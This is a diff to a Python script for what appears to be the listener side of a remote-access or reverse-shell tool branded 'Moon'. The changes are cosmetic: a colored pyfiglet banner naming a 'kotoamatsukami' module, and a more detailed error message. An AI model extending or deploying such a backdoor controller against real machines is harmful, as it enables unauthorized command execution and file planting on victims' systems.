@@ -2,6 +2,16 @@ import socket
 import json
 import base64
 import subprocess
+import pyfiglet
+from colorama import *
+
+
+def draw_logo(module):
+    logo = pyfiglet.figlet_format("\t\t\t Moon", font="slant")
+    logo = Fore.RED + logo + Style.RESET_ALL
+    module = Fore.RED + f"{module}" + Style.RESET_ALL
+    line = pyfiglet.figlet_format("[][][][][][][][]", font="digital")
+    print(f"{logo}[:]>{module}<[:]\n{line}")
 
 
 class Listener:
@@ -51,7 +61,7 @@ class Listener:
             result = result.decode("utf-8")
             return result
         except AttributeError:
-            return "[-] AttributeError"
+            return f"[-] AttributeError in -> {command}"
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
@@ -96,16 +106,7 @@ if __name__ == "__main__":
 
     if term:
         subprocess.call("clear")
-        tag = ["╔═╗╔═╗╔═══╗╔═══╗╔═╗─╔╗",
-               "║║╚╝║║║╔═╗║║╔═╗║║║╚╗║║",
-               "║╔╗╔╗║║║─║║║║─║║║╔╗╚╝║",
-               "║║║║║║║║─║║║║─║║║║╚╗║║",
-               "║║║║║║║╚═╝║║╚═╝║║║─║║║",
-               "╚╝╚╝╚╝╚═══╝╚═══╝╚╝─╚═╝"]
-
-        for i in tag:
-            print(f"\t{i}")
-        print("-"*42)
+        draw_logo("kotoamatsukami")
 
     port = 8080
     listener = Listener(port)
